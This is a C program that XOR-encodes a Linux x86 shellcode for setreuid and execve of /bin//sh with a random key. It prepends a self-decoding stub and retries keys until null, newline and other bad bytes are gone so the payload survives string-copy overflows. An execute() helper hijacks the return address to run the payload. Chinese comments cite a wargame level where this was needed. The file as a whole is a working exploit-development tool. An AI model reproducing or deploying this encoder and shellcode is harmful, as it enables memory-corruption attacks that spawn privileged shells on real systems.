#include <sys/time.h>
#include <stdlib.h>
#include <unistd.h>

int getnumber(int quo)
{
  int seed;
  struct timeval tm;
  gettimeofday(&tm, NULL);
  seed = tm.tv_sec + tm.tv_usec;
  srandom(seed);
  return (random() % quo);
}

void execute(char *data)
{
  printf("Executing....\n");
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)data;
}

void print_code(char *data)
{
  int i,l = 15;
  for(i=0; i<strlen(data); ++i)
  {
    printf("\\x%02x", ((unsigned char *)data)[i]);
  }
  printf("\";\n\n");
}

int main()
{
  char shellcode[] =  "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58"
                      "\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
                      "\x62\x69\x89\xe3\x89\xd1\xcd\x80";
  int count;
  int number = getnumber(200);
  int badchar = 0;
  int ldecoder;
  int lshellcode = strlen(shellcode);
  char *result;
  /* decoder中的\x22对应的是需要编码的shellcode的长度，按照实际情况修改 */
  /* char shellcode[]="\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58"
                      "\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
                      "\x62\x69\x89\xe3\x89\xd1\xcd\x80";
                      shellcode长度为0x22(34)
  */
  char decoder[] = "\xd9\xe1\xd9\x74\x24\xf4\x5a\x80\xc2\x14\x31\xc9\xb1\x22\x80\x32\x00\x42\xe2\xfa";
  ldecoder = strlen(decoder);
  decoder[16] = number;
  do
  {
    if (badchar == 1)
    {
      number = getnumber(10);
      decoder[16] = number;
      badchar = 0;
    }
    for(count = 0; count < lshellcode; count++)
    {
      shellcode[count] = shellcode[count] ^ number;
      /* 过滤危险字符，0x0a会导致strncpy截断(IO level5_alt中发现) */
      if (shellcode[count] == '\0'  || shellcode[count] == '\x0a' || 
          shellcode[count] == '\xcd'|| shellcode[count] == '\xe8' || 
          shellcode[count] == '\xdb')
      {
        badchar = 1;
      }
    }
  }while(badchar == 1);
  
  result = malloc(lshellcode + ldecoder);
  strcpy(result, decoder);
  strcat(result,shellcode);
  printf("\n good char: 0x%02x", number);
  printf("\n char encoded[] = \n");
  print_code(result);
  free(result);
  return 0;
}
